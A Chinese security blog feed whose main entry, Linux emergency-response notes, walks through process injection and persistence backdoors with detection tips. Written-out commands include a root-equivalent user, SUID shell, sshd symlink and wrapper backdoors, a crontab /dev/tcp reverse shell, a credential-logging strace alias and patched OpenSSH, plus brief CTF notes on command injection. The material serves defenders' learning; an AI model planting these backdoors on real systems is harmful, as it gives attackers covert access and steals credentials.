src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-7.png"></p><p>第二种方法：进程注入工具linux-inject</p><p>linux-inject是用于将共享对象注入Linux进程的工具</p><p>github项目地址： <a href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载程序编译</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;gaffe23&#x2F;linux-inject.git</span><br><span class="line">cd linux-inject &amp;&amp; make</span><br><span class="line"># 测试进程</span><br><span class="line">.&#x2F;sample-target</span><br><span class="line"># 进程注入</span><br><span class="line">.&#x2F;inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure><p>验证进程注入成功，如下图所示：</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-8.png"></p><p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。</p><p>下载地址：<a href="https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/">https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 下载解压</span><br><span class="line">wget https:&#x2F;&#x2F;jaist.dl.sourceforge.net&#x2F;project&#x2F;cymothoa&#x2F;cymothoa-1-beta&#x2F;cymothoa-1-beta.tar.gz</span><br><span class="line">tar zxvf cymothoa-1-beta.tar.gz </span><br><span class="line"># </span><br><span class="line">cd cymothoa-1-beta &amp;&amp; make</span><br></pre></td></tr></table></figure><h3 id="0x07-结语"><a href="#0x07-结语" class="headerlink" title="0x07 结语"></a>0x07 结语</h3><p>本文主要介绍了Linux下的几种隐藏技术，包括隐藏文件、隐藏权限、隐藏历史操作命令、端口复用、进程隐藏等方面的技巧。仅作抛砖引玉之用，欢迎留言分享。</p><p>参考文章：</p><p>Tiny Shell</p><p>这款工具通过在源码中设置PROCESS_NAME为bash，以使得其运行后的进程名显示为bash。 在恶意代码中通过设置具有迷惑性的进程名字，以达到躲避管理员检查的目的。</p><p><a href="https://github.com/orangetw/tsh">https://github.com/orangetw/tsh</a></p><p>参考文章：<a href="https://www.freebuf.com/sectool/138350.html">https://www.freebuf.com/sectool/138350.html</a></p><p>mount-bind</p><p>利用mount —bind 将另外一个目录挂载覆盖至/proc/目录下指定进程ID的目录</p><p>聊一聊Linux下进程隐藏的常见手法及侦测手段 <a href="https://www.anquanke.com/post/id/160843">https://www.anquanke.com/post/id/160843</a></p><p>反入侵之发现后门利用mount-bind将进程和端口信息隐匿 <a href="https://www.freebuf.com/articles/network/140535.html">https://www.freebuf.com/articles/network/140535.html</a></p><p><a href="https://blog.csdn.net/liuqz2009/article/details/43530201">https://blog.csdn.net/liuqz2009/article/details/43530201</a> Linux 共享库注入后门</p><p>linux 进程注入后门工具Cymothoa</p><p>如何隐藏你的 Linux 的命令行历史 <a href="https://www.linuxprobe.com/hidden-cmd-history.html">https://www.linuxprobe.com/hidden-cmd-history.html</a></p><p>利用sslh实现端口复用 <a href="https://www.bbsmax.com/A/QW5YwpWezm/">https://www.bbsmax.com/A/QW5YwpWezm/</a></p><p>远程遥控 IPTables 进行端口复用 <a href="https://www.freebuf.com/articles/network/137683.html">https://www.freebuf.com/articles/network/137683.html</a></p><p>Venom 多级代理工具</p><p>linux 下隐藏进程的一种方法及遇到的坑</p><p><a href="https://www.jb51.net/article/147024.htm">https://www.jb51.net/article/147024.htm</a></p><p>如何在 Linux/Unix/Windows 中发现隐藏的进程和端口 <a href="https://linux.cn/article-9288-1.html">https://linux.cn/article-9288-1.html</a></p><h2 id="后门篇"><a href="#后门篇" class="headerlink" title="后门篇"></a>后门篇</h2><p>本文将对Linux下常见的权限维持技术进行解析，知己知彼百战不殆。</p><p><strong>1、一句话添加用户和密码</strong></p><p>添加普通用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的普通用户</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest</span><br><span class="line"></span><br><span class="line"># useradd -p 方法  &#96; &#96; 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"></span><br><span class="line"># chpasswd方法</span><br><span class="line">useradd guest;echo &#39;guest:123456&#39;|chpasswd</span><br><span class="line"></span><br><span class="line"># echo -e方法</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure><p>添加root用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的root用户</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest -o -u 0 -g root -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test</span><br></pre></td></tr></table></figure><p>可疑用户排查技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br><span class="line"># 查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br></pre></td></tr></table></figure><p><strong>2、SUID Shell</strong></p><p>Suid shell是一种可用于以拥有者权限运行的shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">配合普通用户权限使用</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shell</span><br><span class="line">chmod u+s &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure><p>使用guest用户登录就可疑获取root权限。</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-1.png"></p><p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。</p><p>排查技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 在Linux中查找SUID设置的文件</span><br><span class="line">find . -perm &#x2F;4000 </span><br><span class="line"># 在Linux中查找使用SGID设置的文件</span><br><span class="line">find . -perm &#x2F;2000</span><br><span class="line"># 取消s权限</span><br><span class="line">chmod u-s &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure><p><strong>3、ssh公私钥免密登录</strong></p><p>在客户端上生成一对公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。</p><p>客户端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-2.png"></p><p>进入/root/.ssh/文件夹，查看文件夹的内容，如下所示：</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-3.png"></p><p>其中 <code>id_rsa</code>为私钥，<code>id_rsa.pub</code>为公钥，接下来打开<code>id_rsa.pub</code>，将内容复制到服务器。将<code>id_rsa.pub</code>的内容追加到<code>/root/.ssh/authorized_keys</code>内，配置完成。</p><p>排查技巧：查看<code>/root/.ssh/authorized_keys</code>是否被修改。</p><p><strong>4、软连接</strong></p><p>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。</p><p>在目标服务器上执行一句话后门：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;8888</span><br></pre></td></tr></table></figure><p>执行完之后，任何一台机器<code>ssh root@IP -p 8888</code>，输入任意密码，成功登录。</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-4.png"></p><p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-4-1.png"></p><p><strong>5、SSH wrapper</strong></p><p>首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p><p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p><p>服务端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">mv sshd ..&#x2F;bin&#x2F;</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:target_ip:22,sourceport&#x3D;13377</span><br><span class="line"></span><br><span class="line">#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。</span><br><span class="line">&gt;&gt;&gt; import struct</span><br><span class="line">&gt;&gt;&gt; buffer &#x3D; struct.pack(&#39;&gt;I6&#39;,19526)</span><br><span class="line">&gt;&gt;&gt; print repr(buffer)</span><br><span class="line">&#39;\x00\x00LF&#39;</span><br><span class="line">&gt;&gt;&gt; buffer &#x3D; struct.pack(&#39;&gt;I6&#39;,13377)</span><br><span class="line">&gt;&gt;&gt; print buffer</span><br><span class="line">4A</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-5.png"></p><p>排查技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ls -al &#x2F;usr&#x2F;sbin&#x2F;sshd</span><br><span class="line"># cat &#x2F;usr&#x2F;sbin&#x2F;sshd</span><br><span class="line">可通过重装ssh服务恢复。</span><br></pre></td></tr></table></figure><p><strong>6、strace后门</strong></p><p>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#vim &#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source &#x2F;root&#x2F;.bashrc</span><br></pre></td></tr></table></figure><p><strong>7、crontab反弹shell</strong></p><p>crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。</p><p>a、创建shell脚本，例如在/etc/evil.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.28.131&#x2F;12345  0&gt;&amp;1</span><br><span class="line">chmod +sx &#x2F;etc&#x2F;evil.sh</span><br></pre></td></tr></table></figure><p>b、crontab -e 设置定时任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#每一分钟执行一次</span><br><span class="line">*&#x2F;1 * * * * root &#x2F;etc&#x2F;evil.sh</span><br></pre></td></tr></table></figure><p><strong>8、openssh后门</strong></p><p>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">a、备份SSH配置文件</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old</span><br><span class="line"></span><br><span class="line">b、解压并安装补丁</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch&#x2F;sshbd5.9p1.diff  &#x2F;openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line"></span><br><span class="line">c、记录用户名和密码的文件位置及其密码</span><br><span class="line">vi  includes.h</span><br><span class="line">    #define ILOG &quot;&#x2F;tmp&#x2F;1.txt&quot;             &#x2F;&#x2F;记录登录本机的用户名和密码</span><br><span class="line">    #define OLOG &quot;&#x2F;tmp&#x2F;2.txt&quot;             &#x2F;&#x2F;记录本机登录远程的用户名和密码</span><br><span class="line">    #define SECRETPW &quot;123456789&quot;          &#x2F;&#x2F;后门的密码</span><br><span class="line"></span><br><span class="line">d、修改版本信息</span><br><span class="line">vi version.h</span><br><span class="line">    #define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</span><br><span class="line">    #define SSH_PORTABLE &quot;小版本号&quot;</span><br><span class="line"></span><br><span class="line">e、安装并编译</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc&#x2F;ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">f、对比原来的配置文件，使配置文件一致，然后修改文件日期。</span><br><span class="line"></span><br><span class="line">touch -r  &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old &#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">touch -r  &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line">g、清除操作记录</span><br><span class="line">export HISTFILE&#x3D;&#x2F;dev&#x2F;null</span><br><span class="line">export HISTSIZE&#x3D;0</span><br><span class="line">echo &gt;&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;清空操作日志</span><br></pre></td></tr></table></figure><p>排查技巧：利用strace找出ssh后门.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 1、获取可疑进程PI</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2、跟踪sshd PID</span><br><span class="line">strace -o aa -ff -p  PID</span><br><span class="line"># 3、查看记录密码打开文件</span><br><span class="line">grep open sshd* | grep -v -e No -e  null -e denied| grep  WR</span><br></pre></td></tr></table></figure><p><strong>9、PAM后门</strong></p><p>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。</p><p>利用方法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span><br><span class="line">2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span><br><span class="line">3、编译安装PAM</span><br><span class="line">4、编译完后的文件在：modules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.so，复制到&#x2F;lib64&#x2F;security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span><br></pre></td></tr></table></figure><p>排查技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1、通过Strace跟踪ssh</span><br><span class="line">ps axu | grep sshd</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"># 2、检查pam_unix.so的修改时间</span><br><span class="line">stat &#x2F;lib&#x2F;security&#x2F;pam_unix.so      #32位</span><br><span class="line">stat &#x2F;lib64&#x2F;security&#x2F;pam_unix.so    #64位</span><br></pre></td></tr></table></figure><p><strong>10、rookit后门</strong></p><p>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。</p><p>利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。</p><p>排查技巧：查看端口是否异常，RPM check查看命令是否被替换。</p><p>参考链接：</p><p>LINUX的两种后门总结(suid shell与inetd)</p><p><a href="https://www.cnblogs.com/milantgh/p/3601812.html">https://www.cnblogs.com/milantgh/p/3601812.html</a></p><p>linux后门总结</p><p><a href="https://www.cnblogs.com/zaqzzz/p/12099463.html">https://www.cnblogs.com/zaqzzz/p/12099463.html</a></p><p><a href="https://www.secpulse.com/archives/100484.html">https://www.secpulse.com/archives/100484.html</a></p><p>linux各种一句话反弹shell总结</p><p><a href="https://yq.aliyun.com/articles/519250?type=2">https://yq.aliyun.com/articles/519250?type=2</a></p><p>Linux OpenSSH后门的添加与防范</p><p><a href="https://yq.aliyun.com/articles/69350">https://yq.aliyun.com/articles/69350</a></p><p>Linux后门整理合集</p><p><a href="https://www.cnblogs.com/maplered/p/9224617.html">https://www.cnblogs.com/maplered/p/9224617.html</a></p><p><a href="https://www.cnblogs.com/zlgxzswjy/p/6209571.html">https://www.cnblogs.com/zlgxzswjy/p/6209571.html</a></p><p>linux 后门</p><p><a href="https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/">https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/</a></p><h1 id="Linux-实战"><a href="#Linux-实战" class="headerlink" title="Linux 实战"></a>Linux 实战</h1><p><a href="https://bypass007.github.io/Emergency-Response-Notes/Linux/">https://bypass007.github.io/Emergency-Response-Notes/Linux/</a></p><p>其他参考资料：</p><p><a href="https://mp.weixin.qq.com/s/qjM7Fh0u0Edsz5C7L_ErGQ">https://mp.weixin.qq.com/s/qjM7Fh0u0Edsz5C7L_ErGQ</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;前言：2020年期间有幸参加了护网，客户在演习阶段出现了一次应急事件，Windows的邮件服务器出现了一个隐藏用户异地登录…… 当时客户有点情绪，加之我们这边确实都是擅长渗透、挖洞的师傅们，所以应急的时候显得很陌生，手忙脚乱，甚至可以说很业余。于是</summary>
      
    
    
    
    
    <category term="Linux应急响应" scheme="https://hack-for.fun/tags/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>CTF - 文件包含</title>
    <link href="https://hack-for.fun/7881c78e.html"/>
    <id>https://hack-for.fun/7881c78e.html</id>
    <published>2020-09-02T16:40:30.000Z</published>
    <updated>2020-09-05T13:26:04.114Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含漏洞技术点"><a href="#文件包含漏洞技术点" class="headerlink" title="文件包含漏洞技术点"></a>文件包含漏洞技术点</h1><p>多数情况此处只考虑php开发的后端网站、CTF 赛题。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h3><p>php 中，与文件包含相关的函数</p><p>require()<br>require_once()<br>include()<br>include_once()</p><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><ul><li>allow_url_open = on</li></ul><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><h3 id="反序列化-SSRF-gt-本地文件包含、读取"><a href="#反序列化-SSRF-gt-本地文件包含、读取" class="headerlink" title="(反序列化)SSRF -&gt; 本地文件包含、读取"></a>(反序列化)SSRF -&gt; 本地文件包含、读取</h3><h3 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h3><h3 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a>临时文件包含</h3><h3 id="session-文件包含"><a href="#session-文件包含" class="headerlink" title="session 文件包含"></a>session 文件包含</h3><h1 id="Tomcat-Ajp-文件包含、文件读取漏洞"><a href="#Tomcat-Ajp-文件包含、文件读取漏洞" class="headerlink" title="Tomcat Ajp 文件包含、文件读取漏洞"></a>Tomcat Ajp 文件包含、文件读取漏洞</h1><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含漏洞技术点&quot;&gt;&lt;a href=&quot;#文件包含漏洞技术点&quot; class=&quot;headerlink&quot; title=&quot;文件包含漏洞技术点&quot;&gt;&lt;/a&gt;文件包含漏洞技术点&lt;/h1&gt;&lt;p&gt;多数情况此处只考虑php开发的后端网站、CTF 赛题。&lt;/p&gt;
&lt;h2 id=&quot;基础</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF - RCE</title>
    <link href="https://hack-for.fun/dbb484a9.html"/>
    <id>https://hack-for.fun/dbb484a9.html</id>
    <published>2020-08-30T14:20:10.000Z</published>
    <updated>2020-09-02T16:37:39.549Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="RCE-远程代码-命令执行-漏洞技术点"><a href="#RCE-远程代码-命令执行-漏洞技术点" class="headerlink" title="RCE(远程代码\命令执行)漏洞技术点"></a>RCE(远程代码\命令执行)漏洞技术点</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>源码编写逻辑不严，参数入口过滤不严或者没过滤。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li>存在操作者可控的输入</li><li>存在可执行任意代码的危险函数（通过各种手段，包括不安全的反序列化。</li><li>存在可执行远程命令操作的接口</li></ul><h2 id="Linux-、Windows-管道符"><a href="#Linux-、Windows-管道符" class="headerlink" title="Linux 、Windows 管道符"></a>Linux 、Windows 管道符</h2><p>Windows 系统管道符</p><ul><li>“|” ：直接执行后面的语句。eg: ping 127.0.0.1|whoami</li><li>“||”：前面执行的语句执行出错，则执行后面的语句。前面的语句只能为假，eg: ping 2||whoami</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200831112903.png" alt="image-20200831105326087"></p><ul><li>“&amp;”：前面语句为假则直接执行后面的语句，前面的语句可真可假。eg: ping 127.0.0.1&amp;whoam</li><li>“&amp;&amp;” ：前面语句为假则直接出错，也不执行后面的语句，前面语句只能为真。eg : ping 127.0.0.1&amp;&amp;whoami</li></ul><p>Linux 系统管道符</p><p>区别不大，这里只列出不同的。</p><ul><li>“;”：执行完前面的语句再执行后面的语句。eg : ping 127.0.0.1;whoami</li><li>“|”：显示后面语句执行的结果。eg: ping 127.0.0.1|whoami</li></ul><h2 id="PHP-可执行代码、命令的函数"><a href="#PHP-可执行代码、命令的函数" class="headerlink" title="PHP 可执行代码、命令的函数"></a>PHP 可执行代码、命令的函数</h2><blockquote><p>PHP 允许动态函数执行</p></blockquote><p><a href="https://hack-for.fun/d8714939.html#RCE">https://hack-for.fun/d8714939.html#RCE</a></p><ul><li>eval</li><li>assert</li><li>preg_replace() + /e（php &lt; 5.5.0) 下对替换后的字符串作为php代码执行(以eval的形式)代码执行 （php高版本已经废除</li><li>create_function 回调代码执行</li><li>system() exec() ,shell_exec,passthru.pcntl_exec,popen,proc_popen 等用于执行外部程序的<code>command</code>命令</li><li>反引号命令执行</li></ul><hr><p>一些高级技巧：</p><ul><li>限制字符长度RCE</li><li>无参数RCE</li><li>无字母数字 webshell</li></ul><h2 id="其他语言（Python-JAVA"><a href="#其他语言（Python-JAVA" class="headerlink" title="其他语言（Python, JAVA"></a>其他语言（Python, JAVA</h2><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>subprocess 模块</p><p>可以执行shell命令的相关模块和函数有：</p><p>os.system<br>os.spawn<br>os.popen –废弃<br>popen2.* –废弃<br>commands.* –废弃，3.x中被移除</p><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;RCE-远程代码-命令执行-漏洞技术点&quot;&gt;&lt;a href=&quot;#RCE-远程代码-命令执行-漏洞技术点&quot; class=&quot;headerlink&quot; title=&quot;RCE(远程代码\命令执行)漏洞技术点&quot;&gt;&lt;/a&gt;RCE(远程代码\命令执行)漏洞</summary>
      
    
    
    
    
